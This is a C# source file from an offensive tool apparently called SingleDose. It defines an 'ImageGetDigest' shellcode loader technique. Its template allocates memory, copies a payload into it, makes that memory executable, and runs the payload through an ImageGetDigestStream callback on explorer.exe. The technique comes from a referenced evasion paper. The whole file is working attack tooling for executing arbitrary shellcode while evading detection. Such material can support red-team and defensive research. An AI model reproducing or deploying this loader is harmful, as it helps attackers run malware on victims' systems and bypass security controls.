using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    //https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Process%20Creation%20and%20Shellcode%20Execution/Callback%20Injection%20via%20ImageGetDigestStream.cpp
    internal class ImageGetDigest : ITechnique
    {
        string ITechnique.TechniqueName => "ImageGetDigest";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Process%20Creation%20and%20Shellcode%20Execution/Callback%20Injection%20via%20ImageGetDigestStream.cpp"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "CreateFile", "ImageGetDigestStream", "CloseHandle" };
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            IntPtr hImage = CreateFile(@""C:\windows\explorer.exe"", 0x80000000, 0x00000001, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            ImageGetDigestStream(hImage, 0x04, hAlloc, IntPtr.Zero);
            CloseHandle(hImage);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
